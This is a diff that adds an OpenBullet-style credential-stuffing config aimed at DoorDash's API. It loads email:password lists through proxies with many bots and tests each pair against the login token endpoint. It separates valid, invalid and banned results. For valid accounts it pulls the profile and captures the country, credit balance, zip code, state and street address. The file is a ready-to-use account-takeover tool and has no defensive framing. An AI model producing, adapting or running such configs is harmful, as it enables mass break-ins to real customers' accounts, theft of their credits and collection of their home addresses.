@@ -1,0 +1,88 @@
+[SETTINGS]
+{
+  "Name": "DoorDash API",
+  "SuggestedBots": 50,
+  "MaxCPM": 0,
+  "LastModified": "2020-03-19T16:17:14.3943282-04:00",
+  "AdditionalInfo": "",
+  "Author": "Aaron Kong | Privileged Owner#1680",
+  "Version": "1.4.4 [Anomaly]",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "EncodeData": false,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "CaptchaUrl": "",
+  "Base64": "",
+  "Grayscale": false,
+  "RemoveLines": false,
+  "RemoveNoise": false,
+  "Dilate": false,
+  "Threshold": 1.0,
+  "DiffKeep": 0.0,
+  "DiffHide": 0.0,
+  "Saturate": false,
+  "Saturation": 0.0,
+  "Transparent": false,
+  "Contour": false,
+  "OnlyShow": false,
+  "ContrastGamma": false,
+  "Contrast": 1.0,
+  "Gamma": 1.0,
+  "Brightness": 1.0,
+  "RemoveLinesMin": 0,
+  "RemoveLinesMax": 0,
+  "Crop": false,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST POST "https://api.doordash.com/v2/auth/token/" AutoRedirect=FALSE 
+  CONTENT "{\"client_id\":\"4010022695120400\",\"email\":\"<USER>\",\"is_manual\":true,\"password\":\"<PASS>\"}" 
+  CONTENTTYPE "application/json; charset=UTF-8" 
+  HEADER "User-Agent: okhttp/3.12.1" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "\"token\"" 
+  KEYCHAIN Failure OR 
+    KEY "to login with provided credentials" 
+  KEYCHAIN Ban OR 
+    KEY "Login banned due to violation of terms of service" 
+    KEY "<title>406 Not Acceptable</title><" 
+
+PARSE "<SOURCE>" JSON "token" -> VAR "token" 
+
+REQUEST GET "https://api.doordash.com/v2/consumers/me/?expand=account_credits_monetary_fields&expand=default_payment_card&expand=referree_amount_monetary_fields&expand=referrer_amount_monetary_fields&fields=account_credits_monetary_fields&fields=account_credits_monetary_fields.currency&fields=account_credits_monetary_fields.decimal_places&fields=account_credits_monetary_fields.display_string&fields=account_credits_monetary_fields.unit_amount&fields=default_country_shortname&fields=default_address&fields=default_payment_card&fields=email&fields=first_name&fields=has_accepted_latest_terms_of_service&fields=has_usable_password&fields=id&fields=is_guest&fields=last_name&fields=num_orders_submitted&fields=phone_number&fields=receive_marketing_push_notifications&fields=receive_push_notifications&fields=receive_text_notifications&fields=referree_amount_monetary_fields&fields=referree_amount_monetary_fields.currency&fields=referree_amount_monetary_fields.decimal_places&fields=referree_amount_monetary_fields.display_string&fields=referree_amount_monetary_fields.unit_amount&fields=referrer_amount_monetary_fields&fields=referrer_amount_monetary_fields.currency&fields=referrer_amount_monetary_fields.decimal_places&fields=referrer_amount_monetary_fields.display_string&fields=referrer_amount_monetary_fields.unit_amount&fields=social_account_providers" AutoRedirect=FALSE 
+  
+  HEADER "User-Agent: DoorDashConsumer/Android" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+  HEADER "Client-Version: android v10.10.0 b510" 
+  HEADER "Authorization: JWT <token>" 
+
+PARSE "<SOURCE>" LR "country_code\":\"" "\"," CreateEmpty=FALSE -> CAP "COUNTRY" 
+
+PARSE "<SOURCE>" LR "display_string\":\"" "\",\"" CreateEmpty=FALSE -> CAP "Credits" 
+
+PARSE "<SOURCE>" LR "\",\"zip_code\":\"" "\"},\"" CreateEmpty=FALSE -> CAP "Zip Code" 
+
+PARSE "<SOURCE>" LR "state\":\"" "\"," CreateEmpty=FALSE -> CAP "State" 
+
+PARSE "<SOURCE>" LR "street\":\"" "\",\"" CreateEmpty=FALSE -> CAP "Address" 
+
